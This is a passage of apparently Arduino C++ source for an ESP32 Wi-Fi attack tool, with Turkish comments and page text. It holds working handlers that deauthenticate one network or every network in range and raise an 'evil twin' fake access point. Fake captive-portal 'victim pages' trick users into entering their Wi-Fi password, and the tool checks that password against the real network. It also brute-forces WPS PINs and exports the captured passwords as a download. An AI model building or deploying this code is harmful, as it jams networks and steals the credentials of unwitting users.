    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<meta http-equiv='refresh' content='12; url=/test_result'>"
    "<title>Test Ediliyor...</title>"
    "<style>"
    "body{font-family:'Segoe UI',sans-serif;background:#0d1117;"
    "display:flex;align-items:center;justify-content:center;height:100vh;margin:0}"
    ".box{background:#161b22;border:1px solid #30363d;border-radius:14px;"
    "padding:36px 28px;max-width:320px;text-align:center}"
    ".spin{width:44px;height:44px;border:4px solid #30363d;"
    "border-top-color:#58a6ff;border-radius:50%;animation:s 1s linear infinite;"
    "margin:0 auto 20px}"
    "@keyframes s{to{transform:rotate(360deg)}}"
    "h2{color:#f0f6fc;font-size:1.1em;margin-bottom:8px}"
    "p{color:#8b949e;font-size:.82em;line-height:1.5}"
    "</style></head><body>"
    "<div class='box'><div class='spin'></div>"
    "<h2>Sifre Dogrulaniyor</h2>"
    "<p>Gercek aga baglaniliyor,<br>lutfen bekleyin...</p>"
    "</div></body></html>"));
  // ← handler burada döner; TCP flush olur; tarayıcı sayfayı görür
}

static void handle_test_result() {
  if (!et_result_ready) {
    // Test henuz bitmedi — 3 saniye sonra tekrar kontrol et
    String html = F("<!DOCTYPE html><html><head><meta charset='UTF-8'>"
      "<meta name='viewport' content='width=device-width,initial-scale=1'>"
      "<meta http-equiv='refresh' content='3; url=/test_result'>"
      "<title>Bekleniyor...</title>"
      "<style>"
      "body{font-family:'Segoe UI',sans-serif;background:#0d1117;"
      "display:flex;align-items:center;justify-content:center;height:100vh;margin:0}"
      ".box{background:#161b22;border:1px solid #30363d;border-radius:14px;"
      "padding:36px 28px;max-width:320px;text-align:center}"
      ".spin{width:44px;height:44px;border:4px solid #30363d;"
      "border-top-color:#58a6ff;border-radius:50%;animation:s 1s linear infinite;margin:0 auto 20px}"
      "@keyframes s{to{transform:rotate(360deg)}}"
      "h2{color:#f0f6fc;font-size:1.1em;margin-bottom:8px}"
      "p{color:#8b949e;font-size:.82em}"
      "</style></head><body>"
      "<div class='box'><div class='spin'></div>"
      "<h2>Test Devam Ediyor</h2>"
      "<p>Lutfen bekleyin...</p>"
      "</div></body></html>");
    server.send(200, "text/html", html);
    return;
  }

  if (et_result_correct) {
    String html = F("<!DOCTYPE html><html><head><meta charset='UTF-8'>"
      "<meta name='viewport' content='width=device-width,initial-scale=1'>"
      "<title>Baglandi</title>"
      "<style>"
      "body{font-family:'Segoe UI',sans-serif;background:#0d1117;"
      "display:flex;align-items:center;justify-content:center;height:100vh;margin:0}"
      ".box{background:#0d2818;border:1px solid #3fb950;border-radius:14px;"
      "padding:36px 28px;max-width:320px;text-align:center}"
      "h2{color:#3fb950;margin-bottom:10px;font-size:1.2em}"
      "p{color:#8b949e;font-size:.85em;line-height:1.5}"
      "</style></head><body>"
      "<div class='box'>&#9989;"
      "<h2>Baglanti Basarili!</h2>"
      "<p>Ag kimlik bilgileri dogrulandi.<br>Baglaniliyor...</p>"
      "</div></body></html>");
    server.send(200, "text/html", html);
  } else {
    server.sendHeader("Location", "/portal_wrong");
    server.send(302);
  }
}

// Captive portal detection — tüm OS'leri yakala
static void handle_captive_redirect() {
  if (evil_twin_active) {
    server.sendHeader("Location", "http://192.168.4.1/portal");
    server.send(302);
  } else {
    redirect_root();
  }
}

// Android captive portal check (204 bekleniyor, biz redirect yapıyoruz)
static void handle_generate_204() {
  if (evil_twin_active) {
    server.sendHeader("Location", "http://192.168.4.1/portal");
    server.send(302);
  } else {
    server.send(204);
  }
}

// ─── Deauth / Stop handler'lar ────────────────────────────────────────────────

static void handle_deauth() {
  int wifi_number = server.arg("net_num").toInt();
  uint16_t reason = server.arg("reason").toInt();

  String result;
  if (wifi_number < num_networks) {
    start_deauth(wifi_number, DEAUTH_TYPE_SINGLE, reason);
    result = "<div class='alert-ok'>&#9889; Deauth basladi: <b>" + WiFi.SSID(wifi_number) +
             "</b> &mdash; Neden: " + String(reason) + "</div>";
  } else {
    result = F("<div class='alert-err'>&#10060; Gecersiz ag numarasi. Once tarayin.</div>");
  }

  String html = F("<!DOCTYPE html><html><head><meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Sonuc</title><style>");
  html += FPSTR(CSS);
  html += F("</style></head><body><div style='max-width:500px;margin:50px auto'><div class='card'>");
  html += result;
  html += F("<hr><a href='/' style='color:#58a6ff;font-size:.9em'>&#8592; Ana Sayfa</a>"
            "</div></div></body></html>");
  server.send(200, "text/html", html);
}

static void handle_deauth_all() {
  uint16_t reason = server.arg("reason").toInt();

  String html = F("<!DOCTYPE html><html><head><meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Tum Aglar</title><style>");
  html += FPSTR(CSS);
  html += F("</style></head><body><div style='max-width:500px;margin:50px auto'><div class='card'>"
    "<div class='alert-err'>&#128165; Tum aglara saldiri basladi! Durdurmak icin ESP32 resetleyin.</div>"
    "</div></div></body></html>");
  server.send(200, "text/html", html);
  server.stop();
  start_deauth(0, DEAUTH_TYPE_ALL, reason);
}

static void handle_rescan() {
  num_networks = WiFi.scanNetworks();
  redirect_root();
}

static void handle_stop() {
  stop_deauth();
  redirect_root();
}

static void handle_evil_twin() {
  int wifi_number = server.arg("net_num").toInt();
  if (wifi_number < num_networks) {
    if (WiFi.encryptionType(wifi_number) == WIFI_AUTH_OPEN) {
      String html = F("<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Uyari</title><style>");
      html += FPSTR(CSS);
      html += F("</style></head><body><div style='max-width:500px;margin:50px auto'><div class='card'>"
        "<div class='alert-err'>&#9888; Bu ag sifresiz (OPEN). Evil Twin saldirisina gerek yok, sifre yakalanamaz.</div>"
        "<hr><a href='/' style='color:#58a6ff;font-size:.9em'>&#8592; Ana Sayfa</a>"
        "</div></div></body></html>");
      server.send(200, "text/html", html);
      return;
    }
    start_evil_twin(wifi_number);
    server.sendHeader("Location", "/");
    server.send(302);
  } else {
    String html = F("<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Hata</title><style>");
    html += FPSTR(CSS);
    html += F("</style></head><body><div style='max-width:500px;margin:50px auto'><div class='card'>"
      "<div class='alert-err'>&#10060; Gecersiz ag numarasi. Once aglari tarayin.</div>"
      "<hr><a href='/' style='color:#58a6ff;font-size:.9em'>&#8592; Ana Sayfa</a>"
      "</div></div></body></html>");
    server.send(200, "text/html", html);
  }
}

static void handle_stop_evil_twin() {
  stop_evil_twin();
  redirect_root();
}

static void handle_delete_pw() {
  int idx = server.arg("idx").toInt();
  passwords_delete(idx);
  redirect_root();
}

static void handle_clear_pw() {
  passwords_clear_all();
  redirect_root();
}

// ─── WPS PIN Saldırısı Handler'ları ──────────────────────────────────────────

static void handle_wps_scan() {
  if (evil_twin_active) { redirect_root(); return; }
  if (wps_attack_state == WPS_ATTACKING) { redirect_root(); return; }
  wps_scan();
  redirect_root();
}

static void handle_wps_attack() {
  if (evil_twin_active) { redirect_root(); return; }
  if (wps_attack_state == WPS_ATTACKING) { redirect_root(); return; }
  int idx = server.arg("target_idx").toInt();
  wps_start_attack(idx);
  redirect_root();
}

static void handle_wps_stop() {
  wps_stop();   // AP restore wps_stop() içinde yapılıyor
  redirect_root();
}

static void handle_export_pw() {
  int count = passwords_count();
  String txt = "ESP32-Deauther - Yakalanan Sifreler\n";
  txt += "====================================\n";
  if (count == 0) {
    txt += "(Henuz kayitli sifre yok)\n";
  } else {
    for (int i = 0; i < count; i++) {
      SavedPassword sp = passwords_get(i);
      txt += String(i + 1) + ". SSID: " + sp.ssid + " | Sifre: " + sp.password + "\n";
    }
  }
  server.sendHeader("Content-Disposition", "attachment; filename=sifreler.txt");
  server.send(200, "text/plain; charset=utf-8", txt);
}

// ─── Başlatma ─────────────────────────────────────────────────────────────────

void start_web_interface() {
  // Yönetim sayfaları
  server.on("/",               HTTP_GET,  handle_root);
  server.on("/rescan",         HTTP_POST, handle_rescan);
  server.on("/deauth",         HTTP_POST, handle_deauth);
  server.on("/deauth_all",     HTTP_POST, handle_deauth_all);
  server.on("/stop",           HTTP_POST, handle_stop);
  server.on("/evil_twin",      HTTP_POST, handle_evil_twin);
  server.on("/stop_evil_twin", HTTP_POST, handle_stop_evil_twin);
  server.on("/delete_pw",      HTTP_POST, handle_delete_pw);
  server.on("/clear_pw",       HTTP_POST, handle_clear_pw);
  server.on("/export_pw",      HTTP_GET,  handle_export_pw);

  // WPS PIN brute force
  server.on("/wps_scan",   HTTP_POST, handle_wps_scan);
  server.on("/wps_attack", HTTP_POST, handle_wps_attack);
  server.on("/wps_stop",   HTTP_POST, handle_wps_stop);

  // Captive portal — kurban sayfaları
  server.on("/portal",         HTTP_GET,  handle_portal);
  server.on("/portal_wrong",   HTTP_GET,  handle_portal_wrong);
  server.on("/submit",         HTTP_POST, handle_submit);
  server.on("/test_result",    HTTP_GET,  handle_test_result);

  // OS captive portal detection URL'leri
  server.on("/generate_204",        handle_generate_204);
  server.on("/gen_204",             handle_generate_204);
  server.on("/hotspot-detect.html", handle_captive_redirect);  // iOS/macOS
  server.on("/ncsi.txt",            handle_captive_redirect);  // Windows
  server.on("/connecttest.txt",     handle_captive_redirect);  // Windows
  server.on("/canonical.html",      handle_captive_redirect);  // Firefox
  server.on("/success.txt",         handle_captive_redirect);
  server.on("/redirect",            handle_captive_redirect);

  // User-Agent başlığını topla — portal OS tespiti için
  static const char *hdrs[] = {"User-Agent"};
  server.collectHeaders(hdrs, 1);

  server.begin();
}

void web_interface_handle_client() {
  server.handleClient();
}
